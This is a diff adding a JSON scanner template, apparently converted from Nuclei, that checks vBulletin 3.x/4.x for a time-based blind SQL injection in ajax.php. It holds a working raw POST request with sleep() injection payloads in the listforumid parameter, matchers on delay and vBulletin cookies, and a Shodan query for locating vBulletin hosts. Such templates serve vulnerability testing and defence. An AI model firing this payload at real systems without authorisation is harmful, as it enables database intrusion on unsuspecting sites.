@@ -1,0 +1,130 @@
+{
+  "id": "vbulletin-ajaxreg-sqli",
+  "name": "vBulletin 3.x / 4.x AjaxReg - SQL Injection",
+  "author": "mastercho",
+  "severity": "CRITICAL",
+  "description": "vBulletin versions 3.x and 4.x suffer from an AjaxReg remote blind SQL injection vulnerability.\n",
+  "references": [
+    "https://packetstormsecurity.com/files/118703/vBulletin-3.x-4.x-AjaxReg-SQL-Injection.html"
+  ],
+  "tags": [
+    "time-based-sqli",
+    "packetstorm",
+    "vbulletin",
+    "ajaxreg",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "http.component:\"vBulletin\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-89",
+  "cvssScore": "9.8",
+  "cvssMetrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "@timeout: 20s\nPOST /ajax.php?do\u003dinforum\u0026listforumid\u003d(select(0)from(select(sleep(6)))v)/*\u0027%2B(select(0)from(select(sleep(6)))v)%2B\u0027\"%2B(select(0)from(select(sleep(6)))v)%2B\"*/\u0026result\u003d10 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nundefined\u0026s\u003d\u0026securitytoken\u003dguest\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "duration\u003e\u003d6",
+            "status_code \u003d\u003d 200",
+            "contains_any(header, \"bb_lastvisit\", \"bb_sessionhash\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "vbulletin-ajaxreg-sqli",
+    "info": {
+      "name": "vBulletin 3.x / 4.x AjaxReg - SQL Injection",
+      "author": "mastercho",
+      "severity": "critical",
+      "description": "vBulletin versions 3.x and 4.x suffer from an AjaxReg remote blind SQL injection vulnerability.\n",
+      "reference": [
+        "https://packetstormsecurity.com/files/118703/vBulletin-3.x-4.x-AjaxReg-SQL-Injection.html"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "cvss_score": "9.8",
+        "cwe_id": "CWE-89"
+      },
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "http.component:\"vBulletin\""
+      },
+      "tags": "time-based-sqli,packetstorm,vbulletin,ajaxreg,sqli"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "@timeout: 20s\nPOST /ajax.php?do\u003dinforum\u0026listforumid\u003d(select(0)from(select(sleep(6)))v)/*\u0027%2B(select(0)from(select(sleep(6)))v)%2B\u0027\"%2B(select(0)from(select(sleep(6)))v)%2B\"*/\u0026result\u003d10 HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nundefined\u0026s\u003d\u0026securitytoken\u003dguest\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "duration\u003e\u003d6",
+              "status_code \u003d\u003d 200",
+              "contains_any(header, \"bb_lastvisit\", \"bb_sessionhash\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
